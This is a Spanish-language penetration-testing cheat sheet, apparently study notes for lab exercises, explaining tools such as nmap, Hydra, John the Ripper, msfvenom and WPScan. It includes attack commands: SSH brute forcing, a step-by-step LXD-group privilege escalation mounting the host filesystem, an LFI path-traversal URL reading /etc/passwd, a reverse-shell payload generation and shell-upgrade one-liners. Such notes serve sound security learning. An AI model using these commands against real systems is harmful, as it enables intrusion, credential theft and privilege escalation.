
- ***NMAP***: "Network Mapper", es una herramienta de escaneo de red de código abierto y gratuita que se utiliza para descubrir hosts y servicios en una red de computadoras.
	
	***Ejemplo de comando***: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.11.161 -oA allPorts
	
	sudo: Este comando se utiliza para ejecutar el siguiente comando con privilegios de superusuario (administrador). Algunas funciones de nmap pueden requerir privilegios elevados para funcionar correctamente.

    nmap: Es el comando principal para ejecutar la herramienta Nmap, una utilidad popular de escaneo de puertos y red.

    -p-: La opción -p especifica los puertos que deseas escanear. Al usar -p-, le estás diciendo a Nmap que escanee todos los puertos posibles (1-65535).

    --open: Esta opción le indica a Nmap que muestre solo los puertos abiertos en la salida.

    -sS: La opción -sS especifica el tipo de escaneo a realizar. En este caso, estás utilizando un escaneo SYN (también conocido como "escaneo sigiloso" o "half-open scan"), que es un tipo de escaneo que no completa el proceso de conexión TCP, lo que lo hace más difícil de detectar.

    --min-rate 5000: La opción --min-rate establece la velocidad mínima de envío de paquetes en paquetes por segundo. En este ejemplo, estás estableciendo una velocidad mínima de 5000 paquetes por segundo para acelerar el escaneo.

    -vvv: Esta opción aumenta el nivel de verbosidad de la salida de Nmap. Cuantas más v se incluyan, más detallada será la salida. En este caso, estás utilizando tres v para una salida muy detallada.

    -n: La opción -n le indica a Nmap que no realice una resolución de DNS, lo que puede acelerar el escaneo.

    -Pn: Esta opción le indica a Nmap que no realice un ping antes de escanear. Al usar -Pn, Nmap asume que el host está activo y procede directamente al escaneo de puertos. Esto es útil cuando un host no responde a pings pero aún tiene puertos abiertos.

    192.168.11.161: Esta es la dirección IP del objetivo que deseas escanear.

    -oA allPorts: La opción -oA indica a Nmap que guarde la salida del escaneo en un archivo con el nombre proporcionado (allPorts en este caso) en tres formatos diferentes: normal, XML y grepable.

  



- ***GoBuster***: herramienta de escaneo de directorios y archivos en sitios web y servidores, así como de fuerza bruta de subdominios, utilizando palabras de un diccionario. 
	La herramienta es útil para descubrir directorios, archivos y subdominios no enumerados o escondidos que pueden contener información sensible o vulnerabilidades.
	GoBuster también puede utilizarse para buscar subdominios con la opción dns. Por ejemplo, si deseas buscar subdominios de example.com utilizando el archivo de diccionario wordlist.txt:
	Comando: gobuster dns -d example.com -w wordlist.txt


 	 ***Ejemplo de comando***: gobuster dir -u http://10.10.88.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

	gobuster: Es el comando principal para ejecutar la herramienta GoBuster, una utilidad de escaneo de directorios y archivos en sitios web y servidores.

	dir: Indica que deseas realizar un escaneo de directorios y archivos en el sitio web proporcionado. GoBuster también admite otros modos como dns para buscar subdominios, pero en este caso, estás 	utilizando el modo dir.

	-u http://10.10.88.69: La opción -u especifica la URL del objetivo que deseas escanear. En este caso, es http://10.10.88.69. Reemplaza la dirección IP con la dirección IP o el dominio del objetivo r
  	real que deseas escanear.

	-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: La opción -w indica el archivo de diccionario que se utilizará para realizar la búsqueda de directorios y archivos ocultos.
  
	En este ejemplo, estás utilizando el archivo de diccionario directory-list-2.3-medium.txt que se encuentra en el directorio /usr/share/wordlists/dirbuster/. 
	Este archivo de diccionario contiene una lista de palabras (nombres de directorios y archivos) que GoBuster probará en el sitio web objetivo para encontrar coincidencias.





- ***enum4linux***: Herramienta de enumeración basada en Perl. Ayuda a obtener información sobre usuarios, grupos, comparticiones.

	
	***Ejemplo de comando***: /usr/share/enum4linux/enum4linux.pl -a 10.10.88.69. 

	
	/usr/share/enum4linux/enum4linux.pl: Esta es la ruta al script Perl de la herramienta enum4linux en el sistema. El archivo "enum4linux.pl" es un script Perl que contiene el código necesario para 	ejecutar la herramienta.

  	-a: La opción -a es un modificador que indica a enum4linux que realice todas las comprobaciones básicas de enumeración. Esto incluye la enumeración de usuarios, grupos, comparticiones y otros 	detalles del sistema objetivo.

	10.10.88.69: Esta es la dirección IP del sistema Windows o servidor SMB al que se dirigirá el comando enum4linux para realizar la enumeración.

  



- ***John the Ripper***: Herramienta de cracking de contraseñas offline y encriptadas en diferentes formatos. Trabaja descifrando hashes de contraseñas almacenados en archivos.

	
	***Ejemplo de comando***: john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  ||  john --wordlist=/usr/share/wordlists/rockyou.txt --format=MD5 hashes.txt
	
	
	john: Este es el comando principal para ejecutar la herramienta John the Ripper.
	
	Guarda el hash en un archivo de texto: Copia y pega el hash en un archivo de texto (por ejemplo, hashes.txt). Si tienes varios hashes, colócalos en líneas separadas dentro del archivo.

	Identifica el formato de hash: Determina qué algoritmo de hash se utilizó para encriptar la contraseña. Puede ser MD5, SHA-1, bcrypt, entre otros. A veces, 
	esto puede ser complicado si no tienes información adicional sobre cómo se generó el hash.

	Utiliza John the Ripper con el formato de hash y el método de ataque adecuado. Por ejemplo, si el formato de hash es MD5 y deseas utilizar un ataque de diccionario con el archivo rockyou.txt
	
	Puedes ejecutar John the Ripper sin la opción --format, y en ese caso, John intentará detectar automáticamente el formato de hash en función de la estructura del hash proporcionado en el archivo de 	texto. 
	Sin embargo, la detección automática no siempre es 100% precisa y puede llevar más tiempo, ya que John intentará diferentes formatos de hash hasta que encuentre el correcto.





- ***Hydra***: Herramienta para descifrar contraseñas por fuerza bruta. 

	
	***Ejemplo de comando***: hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.123.184

	hydra: Este es el comando principal para ejecutar la herramienta Hydra. Se usa para iniciar el ataque de fuerza bruta.

  	-l jan: La opción -l especifica el nombre de usuario para el que intentaremos adivinar la contraseña. En este caso, el nombre de usuario es "jan".

	-P /usr/share/wordlists/rockyou.txt: La opción -P se utiliza para especificar el archivo de diccionario que contiene las contraseñas que se probarán en el ataque de fuerza bruta. 
	Aquí, se utiliza el archivo "rockyou.txt", que es un archivo de diccionario muy conocido que contiene una gran cantidad de contraseñas reales y comunes.

	ssh://10.10.123.184: Este es el protocolo y la dirección IP del objetivo al que se dirigirá el ataque. 
	En este caso, el protocolo es SSH (Secure Shell), que es un protocolo de red utilizado para acceder de forma segura a sistemas remotos. La dirección IP del objetivo es "10.10.123.184".


 
	
	
- ***LXD***: LXD (Linux Container Daemon) es una herramienta para gestionar contenedores Linux a nivel de sistema operativo. Estos contenedores son similares a las máquinas virtuales, 
	pero son más ligeros y tienen un rendimiento cercano al de un sistema operativo nativo, ya que comparten el mismo núcleo que el host pero tienen espacios de usuario separados.

	El método de escalado de privilegios LXD es una técnica de explotación que se aprovecha de la falta de restricciones adecuadas en la configuración de LXD. 
	Si un usuario tiene acceso a un grupo LXD en un sistema comprometido, puede aprovecharse de esto para crear un contenedor que tenga acceso a todo el sistema de archivos del host. 
	Esto permitiría al atacante explorar el sistema y potencialmente obtener acceso a archivos y recursos confidenciales, lo que efectivamente escala sus privilegios en el sistema.

	Aquí hay un ejemplo de cómo se podría ejecutar un ataque de escalado de privilegios LXD:

	Verificar que el usuario actual es parte del grupo LXD:
	
  	***Comando***: id


	Inicializar LXD si aún no está configurado:
	
  	***Comando***: lxd init


	(Acepta los valores predeterminados o personaliza la configuración según sea necesario)
	Importar una imagen de contenedor en el host comprometido. Por ejemplo, descarga una imagen de Alpine Linux:

	***Comando***: wget https://images.linuxcontainers.org/images/alpine/3.14/amd64/default/20211012_13:00/lxd.tar.xz
	***Comando***: wget https://images.linuxcontainers.org/images/alpine/3.14/amd64/default/20211012_13:00/rootfs.squashfs


	Importar la imagen descargada a LXD:

	***Comando***: lxc image import lxd.tar.xz rootfs.squashfs --alias alpine


	Crear y ejecutar un nuevo contenedor utilizando la imagen importada:

	***Comando***: lxc init alpine my-container -c security.privileged=true


	Montar el sistema de archivos del host en el contenedor:

	***Comando***: lxc config device add my-container host-root disk source=/ path=/mnt/root recursive=true


	Iniciar y unirse al contenedor:

	***Comando***: lxc start my-container
	***Comando***: lxc exec my-container /bin/sh


	Navegar al directorio /mnt/root dentro del contenedor, que ahora es un punto de montaje del sistema de archivos del host:

	***Comando***: cd /mnt/root

	Una vez dentro del contenedor, tendrás acceso completo al sistema de archivos del host y podrás explorarlo para buscar información sensible o modificar archivos según sea necesario. 
	Esto efectivamente escala tus privilegios en el sistema.
	Es importante destacar que este método de escalado de privilegios solo funcionará si el usuario actual tiene acceso al grupo LXD en el sistema comprometido y si LXD está mal configurado o no tiene 	las restricciones de seguridad adecuadas.
	Además, este método no funcionará si el sistema no tiene LXD instalado.



- ***Burp Suite***: Plataforma integrada para realizar pruebas de seguridad de aplicaciones web. Su funcionalidad incluye interceptación y modificación de solicitudes, escaneo automático de vulnerabilidades, repetidor (para manipular y reenviar solicitudes individuales), decodificador de datos y mucho más.

	***Ejemplo de comando***: No es una herramienta de línea de comandos, pero es ampliamente utilizada para el pentesting y la configuración sería la siguiente:

	Abre Burp Suite.
  	En la pestaña "Proxy" -> "Options" -> "Add", asegúrate de tener un listener en la interfaz de bucle invertido (127.0.0.1) en el puerto 8080 (o el puerto que prefieras).
  	Configura tu navegador para que use el proxy de Burp Suite (127.0.0.1 en el puerto 8080) para el tráfico HTTP y HTTPS.
  	Habilita la intercepción en la pestaña "Intercept" y navega por la web. El tráfico se interceptará en Burp Suite, permitiéndote analizar y modificar las solicitudes.
  	Para escanear automáticamente las vulnerabilidades, puedes utilizar la pestaña "Scanner" y para reenviar las solicitudes modificadas, puedes utilizar la herramienta "Repeater".


 
- ***ExifTool***: Es una herramienta de línea de comandos utilizada para leer, escribir y manipular metadatos en una variedad de archivos, particularmente fotos y vídeos. Los metadatos pueden incluir detalles como el modelo de la cámara, la longitud focal, la hora en que se tomó la foto, la ubicación (si el dispositivo tenía GPS) y más.

	***Ejemplo de comando***: exiftool mi_foto.jpg

	exiftool: Este es el comando principal para ejecutar la herramienta ExifTool.

	mi_foto.jpg: Reemplaza "mi_foto.jpg" con el nombre del archivo cuyos metadatos deseas leer. Si tienes una carpeta llena de imágenes y quieres ver los metadatos de todas ellas, puedes hacerlo con: 	exiftool *.jpg

	***Ejemplo de comando para eliminar todos los metadatos***: exiftool -all= mi_foto.jpg

	-all=: La opción -all= le dice a ExifTool que elimine todos los metadatos del archivo especificado. Reemplaza "mi_foto.jpg" con el nombre del archivo cuyos metadatos deseas eliminar.


- ***Binwalk***: Funciona de manera parecida a Exiftool. Es una herramienta para el análisis de archivos binarios y es especialmente útil para el análisis de firmware. Binwalk puede escanear un archivo binario en busca de firmas conocidas y mostrar información sobre cualquier coincidencia que encuentre. A menudo se utiliza para descubrir los contenidos de un firmware, extraer archivos de un blob de datos binarios, o incluso para realizar ingeniería inversa. Binwalk tambíen es capaz de reconocer firmas de archivo como las de los archivos ZIP.

	Si tienes una imagen que sospechas que contiene un archivo ZIP incrustado, puedes utilizar Binwalk para buscar la firma del archivo ZIP en los datos binarios de la imagen. Si Binwalk encuentra la 	firma, puedes utilizarlo para extraer el archivo ZIP de la imagen.

  	***Ejemplo de comando***: binwalk --dd='.*' image.jpg

  	 La opción --dd='.*' especifica que Binwalk debería descomprimir archivos de cualquier tipo (la expresión regular .* coincide con cualquier secuencia de caracteres).


- ***CyberChef***: Herramienta web de código abierto que se utiliza para el análisis de datos, la conversión de formatos y la ciberseguridad. Tiene una interfaz gráfica que permite a los usuarios combinar 	diferentes "operaciones" para manipular datos de entrada de diversas formas. Algunas de estas operaciones incluyen:

	Conversión entre diferentes codificaciones y formatos de datos (por ejemplo, Base64, hexadecimal, binario, etc.)
	Cifrado y descifrado con varios algoritmos (por ejemplo, AES, DES, RSA, etc.)
	Análisis y manipulación de datos de red (por ejemplo, análisis de paquetes IP, construcción de consultas HTTP, etc.)
	Análisis de hash y generación de hash (por ejemplo, MD5, SHA1, etc.)
	Y muchas otras operaciones relacionadas con la ciberseguridad y el análisis de datos.


- ***StegHide***: Herramienta de esteganografía de línea de comandos de código abierto. La esteganografía es la práctica de ocultar información secreta dentro de un archivo ordinario de una manera que no se puede detectar fácilmente. En el caso de Steghide, se puede usar para incrustar información en una variedad de tipos de archivos, pero es más comúnmente utilizado con imágenes y archivos de audio.

  	Una de las principales ventajas de Steghide es que mantiene la apariencia original del archivo mientras oculta información en él. Por ejemplo, si ocultas información en una imagen utilizando 		Steghide, la imagen seguirá pareciendo una imagen normal a simple vista.

	Steghide también soporta cifrado. Esto significa que la información oculta puede ser cifrada con una contraseña, proporcionando una capa adicional de seguridad. Solo alguien que conozca la 		contraseña correcta podrá extraer y descifrar la información oculta.

	***Ejemplo de comando para ocultar un archivo***: steghide embed -cf picture.jpg -ef secret.txt

	En este ejemplo, embed es el comando para incrustar información, -cf picture.jpg especifica el archivo de portador (la imagen donde se ocultará la información) y -ef secret.txt especifica el 		archivo que se va a ocultar.

  	***Ejemplo de comando para extraer un archivo oculto***: steghide extract -sf picture.jpg

	Donde extract es el comando para extraer información y -sf picture.jpg especifica el archivo del que se extraerá la información. Steghide te pedirá la contraseña que se utilizó para incrustar la 	información.

 - ***LFI***: Significa Local File Inclusion. Es una vulnerabilidad común que permite a un atacante leer (y a veces ejecutar) archivos en el servidor de aplicaciones web.

Cuando una aplicación web no valida adecuadamente las entradas del usuario que se utilizan para cargar archivos desde el sistema de archivos local, un atacante puede manipular la entrada para leer archivos que no deberían ser accesibles. Los archivos que suelen ser el objetivo de los ataques LFI incluyen los archivos de configuración, los archivos de registro y los archivos de código fuente, todos los cuales pueden contener información sensible.

En algunos casos, si el servidor está mal configurado, un ataque de LFI puede incluso permitir la ejecución de código arbitrario. Esto se hace generalmente incluyendo archivos que contienen código PHP (o el lenguaje en el que esté escrita la aplicación web) y que el atacante ha logrado colocar en el sistema de archivos, a menudo a través de técnicas como el envenenamiento de archivos de registro.

***Ejemplo de vulnerabilidad de una URL***: http://example.com/viewProfile.php?userId=123

La aplicación web carga el perfil de usuario de un archivo en el sistema de archivos local. Cada usuario tiene un archivo de perfil con un nombre que coincide con su ID de usuario. Entonces, el código PHP en viewProfile.php podría ser algo así:

	<?php
    		**$userId = $_GET['userId'];
   	 	include("/var/www/user_profiles/" . $userId . ".php");
	?>

Aquí, la aplicación web está utilizando la entrada del usuario directamente para determinar qué archivo incluir. Si un atacante puede controlar la entrada userId, puede ser capaz de incluir archivos arbitrarios. Por ejemplo, podrían utilizar la siguiente URL:

	http://example.com/viewProfile.php?userId=../../../etc/passwd

Esto explotaría una vulnerabilidad LFI para incluir el archivo **/etc/passwd** del sistema Unix, que contiene información sobre las cuentas de usuario del sistema.

  Hay algunas cosas que puedes buscar en las URL que pueden indicar que un sitio podría ser vulnerable:

-> Parámetros de URL: Si la URL tiene parámetros (como http://example.com/index.php?page=contact), esto podría indicar que el servidor está usando la entrada del usuario para determinar qué contenido mostrar. Este podría ser un indicador de una potencial vulnerabilidad de Inyección de SQL, LFI (Inclusión de Archivo Local), o RFI (Inclusión de Archivo Remoto).

-> Extensiones de archivos: Las extensiones de archivo en las URL (como .php, .asp, .aspx, .jsp, etc.) pueden dar una idea del tipo de tecnologías de servidor que el sitio web está utilizando, lo que puede ayudar a determinar qué tipos de ataques podrían ser efectivos.

-> Formularios de entrada de usuario: Si una página web tiene un formulario para que el usuario introduzca información, es posible que sea vulnerable a ataques como la Inyección de SQL o Cross-Site Scripting (XSS).

-> Autenticación o sesión en la URL: Si ves algo que parece ser un ID de sesión o de usuario en la URL (por ejemplo, http://example.com/profile?userid=123), esto podría indicar que el sitio es vulnerable a ataques de predicción de sesión o de secuestro de sesión.

-> URLs sin proteger HTTPS: Si el sitio está utilizando HTTP en lugar de HTTPS, la comunicación entre el cliente y el servidor no está encriptada y puede ser vulnerable a ataques de intermediario (MITM).

- ***WPScan***: WPScan es una herramienta de escaneo de seguridad muy útil y gratuita que permite a los usuarios o probadores de penetración escanear sitios web de WordPress para detectar posibles vulnerabilidades. Es una herramienta de línea de comandos escrita en Ruby que está diseñada para ser utilizada por administradores de seguridad y profesionales de pruebas de penetración.

WPScan puede ayudar a detectar varios tipos de vulnerabilidades, como:

-> Enumeración de usuarios: WPScan puede enumerar los nombres de usuario que se utilizan en un sitio de WordPress.

-> Detectar plugins y temas: WPScan puede detectar y listar los plugins y temas que se utilizan en un sitio de WordPress, y luego buscar en su base de datos de vulnerabilidades para ver si estos plugins y temas tienen alguna vulnerabilidad conocida.

-> Detectar vulnerabilidades de la versión de WordPress: WPScan también puede detectar la versión de WordPress que se utiliza y buscar en su base de datos de vulnerabilidades para ver si esa versión tiene alguna vulnerabilidad conocida.


***Ejemplo de Comando***: 	-wpscan --url http://example.com

Para realizar un escaneo más **exhaustivo**, que incluya la **enumeración de usuarios y la detección de plugins**, puedes utilizar las siguientes opciones:


	wpscan --url http://example.com --enumerate u,p

***MSFVenom***: Herramienta que forma parte del Metasploit Framework, uno de los marcos de trabajo más populares utilizados para la prueba de penetración y el desarrollo de exploits.

msfvenom se utiliza para generar varios tipos de payloads, que son piezas de código que se pueden ejecutar en una máquina de destino para realizar una acción específica, como abrir un shell de comando, crear una puerta trasera, o cualquier otra acción que pueda ser útil en un contexto de seguridad.

Estos payloads pueden ser generados para diferentes plataformas (Windows, Linux, macOS, etc.) y lenguajes de programación (Python, PHP, Java, etc.), y se pueden utilizar en una amplia gama de escenarios de explotación.

Las capacidades de msfvenom incluyen:

Generar payloads para una variedad de exploits.
Crear encodings personalizados para ayudar a los payloads a evitar la detección por parte de los sistemas de defensa.
Combinar payloads y exploits en un solo archivo para la entrega.
Es una herramienta muy potente y flexible que es fundamental para el trabajo en pruebas de penetración y ciberseguridad.

***Ejemplo de Comando***: $ msfvenom -p java/jsp_shell_reverse_tcp lhost=< Tu dirección IP > lport=< Puerto > -f war -o shell.war 


***Hashcat***: Hashcat es una potente herramienta de cracking de contraseñas, a menudo considerada la más rápida y avanzada del mundo. Es de código abierto y puede ser utilizada tanto en CPU como en GPU.

Hashcat admite cinco modos de ataque únicos para llevar a cabo una variedad de tareas de cracking de contraseñas, incluyendo ataques de fuerza bruta, ataques de diccionario, y ataques de combinación, entre otros.

***Ejemplo de Comando***: hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

-m 0: Este parámetro le dice a Hashcat qué tipo de hash se está descifrando. En este caso, 0 representa MD5.

-a 0: Esto se refiere al modo de ataque. 0 representa un ataque de diccionario.

hashes.txt: Este es el archivo que contiene los hashes que estás intentando descifrar.

/usr/share/wordlists/rockyou.txt: Esta es la ubicación del diccionario de palabras que se utilizará para el ataque de diccionario.

***Consola para Reverse Shell***: Estos son dos comandos que nos van a permitir tener una consola en condiciones cuando accedemos por reverse shell las cuales son mucho mas didácticas e interactivas.
Cuando ingresamos a la consola en reverse, si esta no tiene python, usaremos el siguiente comando:

**script /dev/null -c bash**

Si la consola Si tiene Python, usaremos el siguiente comando: 

**python3 -c 'import pty;pty.spawn("/bin/bash")**
